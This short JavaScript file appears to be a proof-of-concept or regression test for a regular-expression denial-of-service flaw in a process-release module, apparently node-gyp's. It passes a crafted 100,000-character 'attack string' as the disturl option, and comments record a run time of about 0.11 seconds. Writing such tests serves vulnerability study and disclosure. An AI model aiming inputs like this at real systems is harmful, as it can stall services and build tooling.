const processRelease = require("./process-release.js");

//Attack String :""+"a"*100000+"◎"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "◎";

const gyp = {
  opts: {
    disturl: str,
    target: "",
  },
};
console.log(processRelease("", gyp, "", ""));

// real    0m0.113s
// user    0m0.088s
// sys     0m0.010s
